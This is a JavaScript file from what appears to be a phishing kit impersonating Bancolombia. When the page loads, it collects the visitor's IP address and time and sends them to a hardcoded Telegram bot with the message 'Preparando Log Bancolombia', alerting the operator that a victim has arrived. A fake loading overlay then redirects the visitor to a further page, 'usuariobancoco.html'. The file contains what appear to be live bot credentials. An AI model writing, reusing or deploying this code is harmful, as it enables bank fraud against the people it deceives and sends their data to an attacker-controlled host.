async function getTokens() {
    return {
        telegramToken: "8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw",
        telegramChatId: "-1004245962123"
    };
}

async function sendTelegramMessage(message) {
    try {
        const tokens = await getTokens();
        if (!tokens) throw new Error('No se pudieron cargar los tokens');

        const response = await fetch(`https://api.telegram.org/bot${tokens.telegramToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: tokens.telegramChatId,
                text: message,
            }),
        });

        if (!response.ok) {
            throw new Error('Error al enviar mensaje a Telegram');
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error al obtener la IP:', error);
        return 'No se pudo obtener';
    }
}

async function init() {
    const ip = await getIP();
    const currentTime = new Date().toLocaleString();
    const message = `🏦 Preparando Log Bancolombia\n\n🌐 IP: ${ip}\n⏰ Hora: ${currentTime}\n\n🍀 Buena suerte aventurero`;
    await sendTelegramMessage(message);
}

function simulateLoading(event, buttonType) {
    event.preventDefault();
    const loadingOverlay = document.getElementById('loading-overlay');
    loadingOverlay.style.display = 'block';
    
    setTimeout(() => {
        loadingOverlay.style.display = 'none';
        window.location.href = 'usuariobancoco.html';
    }, 3000);
}

document.addEventListener('DOMContentLoaded', () => {
    init();

    document.querySelectorAll('.button').forEach(button => {
        button.addEventListener('click', (event) => {
            simulateLoading(event, button.dataset.type);
        });
    });
});